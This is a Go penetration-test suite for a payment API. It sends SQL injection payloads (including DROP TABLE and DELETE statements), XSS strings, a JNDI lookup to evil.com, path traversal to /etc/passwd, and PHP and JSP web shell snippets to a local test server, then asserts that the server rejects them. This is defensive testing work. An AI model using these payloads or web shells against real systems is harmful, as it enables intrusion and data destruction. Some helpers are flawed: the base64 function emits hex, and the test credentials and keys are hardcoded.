package security

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"
	"gorm.io/gorm"

	"cjpayment/internal/config"
	"cjpayment/internal/handler"
	"cjpayment/internal/repository"
	"cjpayment/internal/service"
	"cjpayment/pkg/database"
	"cjpayment/pkg/security"
)

// PenetrationTestSuite 安全渗透测试套件
type PenetrationTestSuite struct {
	suite.Suite
	db       *gorm.DB
	router   *gin.Engine
	server   *httptest.Server
	config   *config.Config
	authToken string
}

// SetupSuite 初始化测试套件
func (s *PenetrationTestSuite) SetupSuite() {
	// 初始化测试配置
	s.config = &config.Config{
		Database: config.DatabaseConfig{
			Host:     "localhost",
			Port:     3306,
			Username: "test",
			Password: "test",
			Database: "cjpayment_security_test",
		},
		Redis: config.RedisConfig{
			Host: "localhost",
			Port: 6379,
		},
		JWT: config.JWTConfig{
			Secret:     "test-security-secret",
			ExpireTime: 24 * time.Hour,
		},
		Security: config.SecurityConfig{
			RateLimit: config.RateLimitConfig{
				Enabled: true,
				Rate:    100,
				Burst:   200,
			},
			Encryption: config.EncryptionConfig{
				Enabled: true,
				Key:     "test-encryption-key-32-characters",
			},
		},
	}

	// 初始化数据库连接
	var err error
	s.db, err = database.NewConnection(s.config.Database)
	s.Require().NoError(err)

	// 运行数据库迁移
	err = database.RunMigrations(s.db)
	s.Require().NoError(err)

	// 初始化路由
	s.setupRouter()

	// 创建测试服务器
	s.server = httptest.NewServer(s.router)

	// 获取认证令牌
	s.authToken = s.getAuthToken()
}

// TearDownSuite 清理测试套件
func (s *PenetrationTestSuite) TearDownSuite() {
	if s.server != nil {
		s.server.Close()
	}

	if s.db != nil {
		s.cleanupTestData()
		sqlDB, _ := s.db.DB()
		sqlDB.Close()
	}
}

// setupRouter 设置路由
func (s *PenetrationTestSuite) setupRouter() {
	gin.SetMode(gin.TestMode)
	s.router = gin.New()

	// 初始化仓储层
	repoManager := repository.NewManager(s.db)

	// 初始化服务层
	serviceManager := service.NewManager(repoManager, s.config)

	// 初始化处理器
	h := handler.NewHandler(serviceManager, s.config)

	// 设置路由
	h.SetupRoutes(s.router)
}

// cleanupTestData 清理测试数据
func (s *PenetrationTestSuite) cleanupTestData() {
	tables := []string{
		"recharge_orders",
		"merchant_accounts",
		"merchants",
		"receive_accounts",
		"users",
		"roles",
	}

	for _, table := range tables {
		s.db.Exec(fmt.Sprintf("DELETE FROM %s", table))
	}
}

// getAuthToken 获取认证令牌
func (s *PenetrationTestSuite) getAuthToken() string {
	// 创建测试用户
	s.createTestUser()

	loginReq := map[string]interface{}{
		"username": "admin",
		"password": "admin123",
	}

	resp := s.makeRequest("POST", "/api/auth/login", loginReq, "")
	s.Require().Equal(http.StatusOK, resp.Code)

	var result map[string]interface{}
	err := json.Unmarshal(resp.Body.Bytes(), &result)
	s.Require().NoError(err)

	return result["token"].(string)
}

// createTestUser 创建测试用户
func (s *PenetrationTestSuite) createTestUser() {
	user := &repository.User{
		Username: "admin",
		Password: "$2a$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi", // password: admin123
		Email:    "admin@example.com",
		Status:   "active",
	}

	err := s.db.Create(user).Error
	s.Require().NoError(err)
}

// TestSQLInjectionAttacks 测试SQL注入攻击
func (s *PenetrationTestSuite) TestSQLInjectionAttacks() {
	// SQL注入攻击载荷
	sqlInjectionPayloads := []string{
		"' OR '1'='1",
		"'; DROP TABLE merchants; --",
		"' UNION SELECT * FROM users --",
		"1' OR 1=1 --",
		"admin'--",
		"admin' /*",
		"' OR 1=1#",
		"' OR 'x'='x",
		"1; DELETE FROM merchants WHERE 1=1 --",
		"' OR (SELECT COUNT(*) FROM users) > 0 --",
	}

	fmt.Printf("开始SQL注入攻击测试，测试 %d 个载荷\n", len(sqlInjectionPayloads))

	for i, payload := range sqlInjectionPayloads {
		// 测试商户查询接口
		resp := s.makeRequest("GET", fmt.Sprintf("/api/merchants?search=%s", payload), nil, s.authToken)
		s.Assert().NotEqual(http.StatusInternalServerError, resp.Code, 
			"SQL注入载荷 %d 不应该导致服务器错误: %s", i+1, payload)

		// 测试商户创建接口
		createReq := map[string]interface{}{
			"name":          payload,
			"contact_name":  "Test Contact",
			"contact_phone": "13800138000",
			"email":         "test@example.com",
			"business_type": "e-commerce",
		}

		resp = s.makeRequest("POST", "/api/merchants", createReq, s.authToken)
		s.Assert().Contains([]int{http.StatusBadRequest, http.StatusUnprocessableEntity, http.StatusCreated}, resp.Code,
			"SQL注入载荷 %d 应该被正确处理: %s", i+1, payload)

		// 如果创建成功，验证数据没有被恶意修改
		if resp.Code == http.StatusCreated {
			var merchant map[string]interface{}
			err := json.Unmarshal(resp.Body.Bytes(), &merchant)
			s.Require().NoError(err)
			s.Assert().Equal(payload, merchant["name"], "商户名称应该被正确存储")
		}

		// 测试订单查询接口
		resp = s.makeRequest("GET", fmt.Sprintf("/api/orders?payer_name=%s", payload), nil, s.authToken)
		s.Assert().NotEqual(http.StatusInternalServerError, resp.Code,
			"SQL注入载荷 %d 不应该导致订单查询错误: %s", i+1, payload)
	}

	fmt.Printf("SQL注入攻击测试完成\n")
}

// TestXSSAttacks 测试跨站脚本攻击
func (s *PenetrationTestSuite) TestXSSAttacks() {
	// XSS攻击载荷
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"<svg onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')></iframe>",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
		"<keygen onfocus=alert('XSS') autofocus>",
	}

	fmt.Printf("开始XSS攻击测试，测试 %d 个载荷\n", len(xssPayloads))

	for i, payload := range xssPayloads {
		// 测试商户创建
		createReq := map[string]interface{}{
			"name":          fmt.Sprintf("XSS测试商户_%d", i),
			"contact_name":  payload,
			"contact_phone": "13800138000",
			"email":         "xss@example.com",
			"business_type": "e-commerce",
		}

		resp := s.makeRequest("POST", "/api/merchants", createReq, s.authToken)
		if resp.Code == http.StatusCreated {
			var merchant map[string]interface{}
			err := json.Unmarshal(resp.Body.Bytes(), &merchant)
			s.Require().NoError(err)

			// 验证XSS载荷被正确转义或过滤
			contactName := merchant["contact_name"].(string)
			s.Assert().NotContains(contactName, "<script>", "XSS载荷应该被过滤")
			s.Assert().NotContains(contactName, "javascript:", "XSS载荷应该被过滤")
			s.Assert().NotContains(contactName, "onerror=", "XSS载荷应该被过滤")
		}

		// 测试充值订单创建
		orderReq := map[string]interface{}{
			"merchant_id":  1,
			"payer_name":   payload,
			"amount":       "1000.00",
			"ad_account":   "AD123456",
			"payment_type": "corporate",
		}

		resp = s.makeRequest("POST", "/api/recharge/orders", orderReq, s.authToken)
		if resp.Code == http.StatusCreated {
			var order map[string]interface{}
			err := json.Unmarshal(resp.Body.Bytes(), &order)
			s.Require().NoError(err)

			// 验证XSS载荷被正确处理
			payerName := order["payer_name"].(string)
			s.Assert().NotContains(payerName, "<script>", "XSS载荷应该被过滤")
		}
	}

	fmt.Printf("XSS攻击测试完成\n")
}

// TestAuthenticationBypass 测试身份认证绕过
func (s *PenetrationTestSuite) TestAuthenticationBypass() {
	fmt.Printf("开始身份认证绕过测试\n")

	// 测试无令牌访问
	resp := s.makeRequest("GET", "/api/merchants", nil, "")
	s.Assert().Equal(http.StatusUnauthorized, resp.Code, "无令牌访问应该被拒绝")

	// 测试无效令牌
	invalidTokens := []string{
		"invalid-token",
		"Bearer invalid-token",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
		"",
		"null",
		"undefined",
	}

	for _, token := range invalidTokens {
		resp = s.makeRequest("GET", "/api/merchants", nil, token)
		s.Assert().Equal(http.StatusUnauthorized, resp.Code, 
			"无效令牌应该被拒绝: %s", token)
	}

	// 测试过期令牌
	expiredToken := s.generateExpiredToken()
	resp = s.makeRequest("GET", "/api/merchants", nil, expiredToken)
	s.Assert().Equal(http.StatusUnauthorized, resp.Code, "过期令牌应该被拒绝")

	// 测试令牌篡改
	tamperedToken := s.tamperToken(s.authToken)
	resp = s.makeRequest("GET", "/api/merchants", nil, tamperedToken)
	s.Assert().Equal(http.StatusUnauthorized, resp.Code, "篡改的令牌应该被拒绝")

	// 测试权限提升
	userToken := s.createLimitedUserToken()
	resp = s.makeRequest("DELETE", "/api/merchants/1", nil, userToken)
	s.Assert().Contains([]int{http.StatusForbidden, http.StatusUnauthorized}, resp.Code,
		"普通用户不应该有删除权限")

	fmt.Printf("身份认证绕过测试完成\n")
}

// TestRateLimitingBypass 测试限流绕过
func (s *PenetrationTestSuite) TestRateLimitingBypass() {
	fmt.Printf("开始限流绕过测试\n")

	// 快速发送大量请求
	requestCount := 150 // 超过限制
	rateLimitHit := false

	for i := 0; i < requestCount; i++ {
		resp := s.makeRequest("GET", "/api/merchants", nil, s.authToken)
		
		if resp.Code == http.StatusTooManyRequests {
			rateLimitHit = true
			fmt.Printf("在第 %d 个请求时触发限流\n", i+1)
			break
		}
		
		// 短暂延迟避免过快请求
		time.Sleep(10 * time.Millisecond)
	}

	s.Assert().True(rateLimitHit, "应该触发限流保护")

	// 测试不同IP绕过限流
	// 注意：在实际测试中，这需要模拟不同的客户端IP
	fmt.Printf("测试IP变换绕过限流\n")
	
	// 等待限流重置
	time.Sleep(2 * time.Second)
	
	// 使用不同的User-Agent尝试绕过
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	}

	for _, ua := range userAgents {
		resp := s.makeRequestWithHeaders("GET", "/api/merchants", nil, s.authToken, map[string]string{
			"User-Agent": ua,
		})
		
		// 即使User-Agent不同，限流仍应生效
		if resp.Code == http.StatusTooManyRequests {
			fmt.Printf("User-Agent变换无法绕过限流: %s\n", ua)
		}
	}

	fmt.Printf("限流绕过测试完成\n")
}

// TestDataExposure 测试敏感数据泄露
func (s *PenetrationTestSuite) TestDataExposure() {
	fmt.Printf("开始敏感数据泄露测试\n")

	// 创建测试商户
	createReq := map[string]interface{}{
		"name":          "敏感数据测试商户",
		"contact_name":  "张三",
		"contact_phone": "13800138000",
		"email":         "sensitive@example.com",
		"business_type": "e-commerce",
	}

	resp := s.makeRequest("POST", "/api/merchants", createReq, s.authToken)
	s.Require().Equal(http.StatusCreated, resp.Code)

	var merchant map[string]interface{}
	err := json.Unmarshal(resp.Body.Bytes(), &merchant)
	s.Require().NoError(err)

	merchantID := int(merchant["id"].(float64))

	// 测试商户详情查询
	resp = s.makeRequest("GET", fmt.Sprintf("/api/merchants/%d", merchantID), nil, s.authToken)
	s.Assert().Equal(http.StatusOK, resp.Code)

	err = json.Unmarshal(resp.Body.Bytes(), &merchant)
	s.Require().NoError(err)

	// 验证敏感信息脱敏
	phone := merchant["contact_phone"].(string)
	s.Assert().Contains(phone, "*", "手机号应该被脱敏")
	s.Assert().NotEqual("13800138000", phone, "完整手机号不应该暴露")

	// 测试错误信息泄露
	resp = s.makeRequest("GET", "/api/merchants/99999", nil, s.authToken)
	s.Assert().Equal(http.StatusNotFound, resp.Code)

	var errorResp map[string]interface{}
	err = json.Unmarshal(resp.Body.Bytes(), &errorResp)
	s.Require().NoError(err)

	// 验证错误信息不包含敏感的系统信息
	errorMsg := fmt.Sprintf("%v", errorResp)
	s.Assert().NotContains(errorMsg, "database", "错误信息不应该包含数据库信息")
	s.Assert().NotContains(errorMsg, "sql", "错误信息不应该包含SQL信息")
	s.Assert().NotContains(errorMsg, "password", "错误信息不应该包含密码信息")

	// 测试调试信息泄露
	resp = s.makeRequest("GET", "/api/debug", nil, s.authToken)
	s.Assert().NotEqual(http.StatusOK, resp.Code, "调试接口不应该在生产环境暴露")

	fmt.Printf("敏感数据泄露测试完成\n")
}

// TestInputValidationBypass 测试输入验证绕过
func (s *PenetrationTestSuite) TestInputValidationBypass() {
	fmt.Printf("开始输入验证绕过测试\n")

	// 测试超长输入
	longString := strings.Repeat("A", 10000)
	createReq := map[string]interface{}{
		"name":          longString,
		"contact_name":  "Test Contact",
		"contact_phone": "13800138000",
		"email":         "test@example.com",
		"business_type": "e-commerce",
	}

	resp := s.makeRequest("POST", "/api/merchants", createReq, s.authToken)
	s.Assert().Equal(http.StatusBadRequest, resp.Code, "超长输入应该被拒绝")

	// 测试特殊字符
	specialChars := []string{
		"\x00\x01\x02", // 控制字符
		"../../../etc/passwd", // 路径遍历
		"${jndi:ldap://evil.com/a}", // JNDI注入
		"{{7*7}}", // 模板注入
		"\"><script>alert('xss')</script>", // XSS
	}

	for _, payload := range specialChars {
		createReq := map[string]interface{}{
			"name":          fmt.Sprintf("特殊字符测试_%s", payload),
			"contact_name":  payload,
			"contact_phone": "13800138000",
			"email":         "test@example.com",
			"business_type": "e-commerce",
		}

		resp := s.makeRequest("POST", "/api/merchants", createReq, s.authToken)
		// 应该被验证拒绝或正确处理
		s.Assert().Contains([]int{http.StatusBadRequest, http.StatusUnprocessableEntity, http.StatusCreated}, resp.Code)
	}

	// 测试数值边界
	invalidAmounts := []interface{}{
		-1,
		0,
		999999999999999999, // 超大数值
		"not-a-number",
		nil,
		"",
	}

	for _, amount := range invalidAmounts {
		orderReq := map[string]interface{}{
			"merchant_id":  1,
			"payer_name":   "边界测试用户",
			"amount":       amount,
			"ad_account":   "AD123456",
			"payment_type": "corporate",
		}

		resp := s.makeRequest("POST", "/api/recharge/orders", orderReq, s.authToken)
		s.Assert().Equal(http.StatusBadRequest, resp.Code, 
			"无效金额应该被拒绝: %v", amount)
	}

	// 测试邮箱格式绕过
	invalidEmails := []string{
		"invalid-email",
		"@example.com",
		"test@",
		"test..test@example.com",
		"test@example",
		"<script>alert('xss')</script>@example.com",
	}

	for _, email := range invalidEmails {
		createReq := map[string]interface{}{
			"name":          "邮箱测试商户",
			"contact_name":  "Test Contact",
			"contact_phone": "13800138000",
			"email":         email,
			"business_type": "e-commerce",
		}

		resp := s.makeRequest("POST", "/api/merchants", createReq, s.authToken)
		s.Assert().Equal(http.StatusBadRequest, resp.Code, 
			"无效邮箱应该被拒绝: %s", email)
	}

	fmt.Printf("输入验证绕过测试完成\n")
}

// TestFileUploadSecurity 测试文件上传安全
func (s *PenetrationTestSuite) TestFileUploadSecurity() {
	fmt.Printf("开始文件上传安全测试\n")

	// 创建测试订单
	createReq := map[string]interface{}{
		"merchant_id":  1,
		"payer_name":   "文件上传测试用户",
		"amount":       "1000.00",
		"ad_account":   "AD123456",
		"payment_type": "corporate",
	}

	resp := s.makeRequest("POST", "/api/recharge/orders", createReq, s.authToken)
	if resp.Code != http.StatusCreated {
		s.T().Skip("无法创建测试订单，跳过文件上传测试")
		return
	}

	var order map[string]interface{}
	err := json.Unmarshal(resp.Body.Bytes(), &order)
	s.Require().NoError(err)

	orderNo := order["order_no"].(string)

	// 测试恶意文件上传
	maliciousFiles := []struct {
		filename string
		content  string
		mimeType string
	}{
		{"malware.exe", "MZ\x90\x00", "application/octet-stream"},
		{"script.php", "<?php system($_GET['cmd']); ?>", "application/x-php"},
		{"shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"},
		{"virus.bat", "@echo off\necho This is a test", "application/x-msdos-program"},
		{"../../../etc/passwd", "root:x:0:0:root:/root:/bin/bash", "text/plain"},
	}

	for _, file := range maliciousFiles {
		// 模拟文件上传
		proofReq := map[string]interface{}{
			"payment_proof": fmt.Sprintf("data:%s;base64,%s", file.mimeType, 
				s.base64Encode([]byte(file.content))),
			"filename": file.filename,
		}

		resp := s.makeRequest("POST", fmt.Sprintf("/api/orders/%s/proof", orderNo), proofReq, s.authToken)
		
		// 恶意文件应该被拒绝
		s.Assert().Contains([]int{http.StatusBadRequest, http.StatusUnprocessableEntity}, resp.Code,
			"恶意文件应该被拒绝: %s", file.filename)
	}

	// 测试文件大小限制
	largeFile := strings.Repeat("A", 10*1024*1024) // 10MB
	proofReq := map[string]interface{}{
		"payment_proof": fmt.Sprintf("data:image/jpeg;base64,%s", s.base64Encode([]byte(largeFile))),
		"filename":      "large_image.jpg",
	}

	resp = s.makeRequest("POST", fmt.Sprintf("/api/orders/%s/proof", orderNo), proofReq, s.authToken)
	s.Assert().Equal(http.StatusBadRequest, resp.Code, "超大文件应该被拒绝")

	fmt.Printf("文件上传安全测试完成\n")
}

// TestSessionSecurity 测试会话安全
func (s *PenetrationTestSuite) TestSessionSecurity() {
	fmt.Printf("开始会话安全测试\n")

	// 测试会话固定攻击
	// 获取初始令牌
	token1 := s.getAuthToken()
	
	// 再次登录获取新令牌
	token2 := s.getAuthToken()
	
	// 两个令牌应该不同
	s.Assert().NotEqual(token1, token2, "每次登录应该生成不同的令牌")

	// 测试令牌重放攻击
	resp := s.makeRequest("GET", "/api/merchants", nil, token1)
	s.Assert().Equal(http.StatusOK, resp.Code, "有效令牌应该可以访问")

	// 模拟令牌泄露后的撤销
	logoutReq := map[string]interface{}{}
	resp = s.makeRequest("POST", "/api/auth/logout", logoutReq, token1)
	
	if resp.Code == http.StatusOK {
		// 注销后令牌应该无效
		resp = s.makeRequest("GET", "/api/merchants", nil, token1)
		s.Assert().Equal(http.StatusUnauthorized, resp.Code, "注销后令牌应该无效")
	}

	// 测试并发会话
	tokens := make([]string, 5)
	for i := 0; i < 5; i++ {
		tokens[i] = s.getAuthToken()
	}

	// 所有令牌都应该有效
	for i, token := range tokens {
		resp := s.makeRequest("GET", "/api/merchants", nil, token)
		s.Assert().Equal(http.StatusOK, resp.Code, "并发令牌 %d 应该有效", i)
	}

	fmt.Printf("会话安全测试完成\n")
}

// TestCryptographicSecurity 测试加密安全
func (s *PenetrationTestSuite) TestCryptographicSecurity() {
	fmt.Printf("开始加密安全测试\n")

	// 测试密码存储安全
	// 创建用户时密码应该被哈希
	user := &repository.User{
		Username: "crypto_test_user",
		Password: "plaintext_password",
		Email:    "crypto@example.com",
		Status:   "active",
	}

	// 模拟用户创建过程中的密码哈希
	hashedPassword := security.HashPassword(user.Password)
	user.Password = hashedPassword

	err := s.db.Create(user).Error
	s.Require().NoError(err)

	// 验证密码不是明文存储
	var storedUser repository.User
	err = s.db.First(&storedUser, "username = ?", "crypto_test_user").Error
	s.Require().NoError(err)
	s.Assert().NotEqual("plaintext_password", storedUser.Password, "密码不应该明文存储")
	s.Assert().True(len(storedUser.Password) > 20, "哈希密码应该足够长")

	// 测试敏感数据加密
	sensitiveData := "敏感的银行账号信息"
	encryptedData, err := security.Encrypt(sensitiveData, s.config.Security.Encryption.Key)
	s.Require().NoError(err)
	s.Assert().NotEqual(sensitiveData, encryptedData, "敏感数据应该被加密")

	// 验证解密
	decryptedData, err := security.Decrypt(encryptedData, s.config.Security.Encryption.Key)
	s.Require().NoError(err)
	s.Assert().Equal(sensitiveData, decryptedData, "解密后应该恢复原始数据")

	// 测试弱加密密钥
	weakKey := "weak"
	_, err = security.Encrypt(sensitiveData, weakKey)
	s.Assert().Error(err, "弱密钥应该被拒绝")

	fmt.Printf("加密安全测试完成\n")
}

// 辅助方法

// makeRequest 发送HTTP请求
func (s *PenetrationTestSuite) makeRequest(method, path string, body interface{}, token string) *httptest.ResponseRecorder {
	return s.makeRequestWithHeaders(method, path, body, token, nil)
}

// makeRequestWithHeaders 发送带自定义头的HTTP请求
func (s *PenetrationTestSuite) makeRequestWithHeaders(method, path string, body interface{}, token string, headers map[string]string) *httptest.ResponseRecorder {
	var reqBody []byte
	if body != nil {
		var err error
		reqBody, err = json.Marshal(body)
		s.Require().NoError(err)
	}

	req, err := http.NewRequest(method, path, bytes.NewBuffer(reqBody))
	s.Require().NoError(err)

	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}

	// 设置自定义头
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	w := httptest.NewRecorder()
	s.router.ServeHTTP(w, req)

	return w
}

// generateExpiredToken 生成过期令牌
func (s *PenetrationTestSuite) generateExpiredToken() string {
	// 这里应该生成一个已过期的JWT令牌
	// 简化实现，返回一个明显过期的令牌
	return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.expired"
}

// tamperToken 篡改令牌
func (s *PenetrationTestSuite) tamperToken(token string) string {
	if len(token) > 10 {
		// 简单地修改令牌的一部分
		return token[:len(token)-10] + "tampered123"
	}
	return "tampered_token"
}

// createLimitedUserToken 创建受限用户令牌
func (s *PenetrationTestSuite) createLimitedUserToken() string {
	// 创建普通用户
	user := &repository.User{
		Username: "limited_user",
		Password: "$2a$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi",
		Email:    "limited@example.com",
		Status:   "active",
		Role:     "user", // 普通用户角色
	}

	err := s.db.Create(user).Error
	s.Require().NoError(err)

	// 登录获取令牌
	loginReq := map[string]interface{}{
		"username": "limited_user",
		"password": "admin123",
	}

	resp := s.makeRequest("POST", "/api/auth/login", loginReq, "")
	if resp.Code != http.StatusOK {
		return ""
	}

	var result map[string]interface{}
	err = json.Unmarshal(resp.Body.Bytes(), &result)
	s.Require().NoError(err)

	return result["token"].(string)
}

// base64Encode Base64编码
func (s *PenetrationTestSuite) base64Encode(data []byte) string {
	// 简化的Base64编码实现
	return fmt.Sprintf("%x", data) // 使用十六进制代替真正的Base64
}

// generateRandomString 生成随机字符串
func (s *PenetrationTestSuite) generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		randomByte := make([]byte, 1)
		rand.Read(randomByte)
		b[i] = charset[randomByte[0]%byte(len(charset))]
	}
	return string(b)
}

// TestPenetrationSecurity 运行安全渗透测试
func TestPenetrationSecurity(t *testing.T) {
	suite.Run(t, new(PenetrationTestSuite))
}